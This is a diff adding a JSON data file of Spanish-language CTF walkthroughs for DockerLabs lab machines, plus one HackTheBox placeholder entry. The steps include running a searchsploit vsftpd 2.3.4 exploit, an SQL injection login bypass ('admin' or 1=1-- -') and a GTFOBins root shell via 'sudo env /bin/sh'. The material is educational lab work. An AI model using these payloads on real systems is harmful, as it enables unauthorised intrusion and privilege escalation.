@@ -1,0 +1,118 @@
+{
+  "ctfs": [
+    {
+      "category": "Dockerlabs",
+      "projects": [
+        {
+          "id": "DL-001",
+          "title": "First Hacking",
+          "description": "Máquina linux de DockerLabs para practicar hacking ético.",
+          "image": "https://dockerlabs.es/images/logos/logo.png",
+          "machine": "linux",
+          "difficulty": "Fácil",
+          "link": "https://dockerlabs.es/",
+          "solve": {
+            "id": 0,
+            "name": "First Hacking",
+            "step1": [
+              {
+                "step": "Procedemos a reconocer la máquina con un ping",
+                "command1": "ping -c 1 172.17.0.2"
+              }
+            ],
+            "step2": [
+              {
+                "step": "Hacemos un nmap para tener más información sobre esta máquina",
+                "command1": "nmap -p- -sC -sV --min-rate 5000 -vvv  --open -sS -n -Pn 172.17.0.2 -oN escaneo"
+              }
+            ],
+            "step3": [
+              {
+                "step": "Buscamos la vulnerabilidad con `searchsploit`",
+                "command1": "searchsploit vsftpd 2.3.4"
+              }
+            ],
+            "step4": [
+              {
+                "step": "Usamos python para este caso por lo que procedemos a guardar el script con este comando (el script esta en PATH):",
+                "command1": "searchsploit -m unix/remote/49757.py"
+              }
+            ],
+            "step5": [
+              {
+                "step": "Ejecutamos el script pasándole el host y listo!",
+                "command1": "python3 exploit.py 172.17.0.2"
+              }
+            ]
+          }
+        },
+        {
+          "id": "DL-002",
+          "title": "Injection ",
+          "description": "Máquina linux de DockerLabs para practicar hacking ético.",
+          "image": "https://dockerlabs.es/images/logos/logo.png",
+          "machine": "linux",
+          "difficulty": "Fácil",
+          "link": "https://dockerlabs.es/",
+          "solve": {
+            "id": 0,
+            "name": "Injection",
+            "step1": [
+              {
+                "step": "Intentamos acceder pero no nos dice mucho. Ahora procedemos con el escaneo de nmap",
+                "command1": "nmap -p- -sC -sV --open -sS -n -Pn 172.17.0.2 -oN escaneo"
+              }
+            ],
+            "step2": [
+              {
+                "step": "Ahora procedemos hacer el gobuster.",
+                "command1": "gobuster dir -u http://172.17.0.2/ -w /usr/share/dirb/wordlists/common.txt -x php,sh,py,txt"
+              }
+            ],
+            "step3": [
+              {
+                "step": "Al no tener más información procedemos a hacer una inyección sql para ver si podemos acceder al usuario. Introduciendo",
+                "command1": "admin' or 1=1-- -"
+              }
+            ],
+            "step4": [
+              {
+                "step": "Ahora escalaremos privilegios sabiendo el usuario.",
+                "command1": "ssh dylan@172.17.0.2"
+              }
+            ],
+            "step5": [
+              {
+                "step": "Vamos a explotarlo haciendo una búsqueda en [GTFOBins](https://gtfobins.github.io/gtfobins/env/)",
+                "command1": "sudo env /bin/sh"
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "category": "HackTheBox",
+      "projects": [
+        {
+          "id": "HB-001",
+          "title": "CTF HTB 1",
+          "description": "Descripción del CTF HTB 1",
+          "image": "data:image/png;base64,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",
+          "machine": "windows",
+          "difficulty": "Medio",
+          "link": "#",
+          "solve": {
+            "id": 0,
+            "name": "FirstHack",
+            "step1": [{ "step": "Paso 1", "command1": "comando" }],
+            "step2": [{ "step": "Paso 2", "command1": "comando" }],
+            "step3": [{ "step": "Paso 3", "command1": "comando" }],
+            "step4": [{ "step": "Paso 4", "command1": "comando" }],
+            "step5": [{ "step": "Paso 5", "command1": "comando" }]
+          }
+        }
+      ]
+    }
+  ]
+}
